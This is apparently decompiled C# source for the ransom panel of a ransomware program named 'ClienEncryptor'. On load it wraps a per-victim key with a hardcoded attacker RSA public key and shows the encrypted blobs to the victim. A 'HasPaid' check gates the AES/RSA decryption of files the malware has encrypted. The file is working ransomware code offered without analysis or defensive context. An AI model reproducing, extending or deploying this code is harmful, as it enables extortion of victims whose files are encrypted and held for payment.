using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace ClienEncryptor;

public class Panel : Form
{
	private bool HasPaid;

	private IContainer components;

	private Button button1;

	private RichTextBox richTextBox1;

	private RichTextBox richTextBox2;

	private RichTextBox richTextBox3;

	public Panel()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		foreach (string item in EncryptionEngine.encrypted)
		{
			if (EncryptionEngine.Keys.PrivateKey != null)
			{
				HasPaid = true;
				Console.WriteLine("decrypting " + item);
				Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
				File.WriteAllBytes(item, EncryptionEngine.Decrypt_File_AESRSA(encoded, ((Control)richTextBox3).get_Text()));
				File.Move(item, Path.ChangeExtension(item, null));
				continue;
			}
			HasPaid = false;
			break;
		}
	}

	private void Panel_Load(object sender, EventArgs e)
	{
		File.WriteAllText("lol.txt", EncryptionEngine.Keys.PrivateKey);
		EncryptionEngine.RSA.hardcoded.Pub = "MjA0OCE8UlNBS2V5VmFsdWU+PE1vZHVsdXM+cVZYb1Fzd3hxRTU1VGNUQkpYQzRGVmJadHY3ZlhpUWdBOHFNMVJmdVZ3dG1VTVQ5dndUUlhvc01FeXBZVU9pRnBqL25EMTNKRTRBRDdYRlcwS2pJdzFod2hQRFhZNDFmRThkTHhabzZFSkhEcWd6SjU3M0VmQWtKTithNFEvdkR0Sk9jSEJOaFVyWmY4ZytrZEZFWHRPd0Y3SEtMQy9ZRmhjZTlCbVEzbzliU3UyclpJM2VjTjExcWtjNzB3UjBOKzFRY29ZY2ZyRUlrTkNRbHF4V1U2OVNvbFRnYkpYMjg0Ukc0NHNHS2ZLSFhjcFd3TFpENmhRSVA0SGlaVmVJYksyYkczMFFkcnpKZmpzLzVQOHpLUDZzellSb2YvTGR2NCs4cFcrQVg1L1gvQXlnMXEwRmZmR3lTV1EvUDhUSyt2cHROdkNNOSt0VnNtZkxhWGo4VytRPT08L01vZHVsdXM+PEV4cG9uZW50PkFRQUI8L0V4cG9uZW50PjwvUlNBS2V5VmFsdWU+";
		byte[] array = EncryptionEngine.Generate_AES_Key();
		byte[] inArray = EncryptionEngine.AES.AES_Encrypt(Encoding.UTF8.GetBytes(EncryptionEngine.Keys.PrivateKey), array);
		((Control)richTextBox1).set_Text(Convert.ToBase64String(inArray));
		((Control)richTextBox2).set_Text(Convert.ToBase64String(EncryptionEngine.RSA.EncryptBytes(array, EncryptionEngine.RSA.hardcoded.Pub)));
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		button1 = new Button();
		richTextBox1 = new RichTextBox();
		richTextBox2 = new RichTextBox();
		richTextBox3 = new RichTextBox();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(699, 415));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(89, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)richTextBox1).set_Location(new Point(13, 76));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(776, 51));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text("");
		((Control)richTextBox1).add_TextChanged((EventHandler)richTextBox1_TextChanged);
		((Control)richTextBox2).set_Location(new Point(13, 12));
		((Control)richTextBox2).set_Name("richTextBox2");
		((TextBoxBase)richTextBox2).set_ReadOnly(true);
		((Control)richTextBox2).set_Size(new Size(775, 58));
		((Control)richTextBox2).set_TabIndex(2);
		((Control)richTextBox2).set_Text("");
		((Control)richTextBox3).set_Location(new Point(13, 315));
		((Control)richTextBox3).set_Name("richTextBox3");
		((Control)richTextBox3).set_Size(new Size(776, 94));
		((Control)richTextBox3).set_TabIndex(3);
		((Control)richTextBox3).set_Text("");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)richTextBox3);
		((Control)this).get_Controls().Add((Control)(object)richTextBox2);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Panel");
		((Control)this).set_Text("Panel");
		((Form)this).add_Load((EventHandler)Panel_Load);
		((Control)this).ResumeLayout(false);
	}
}
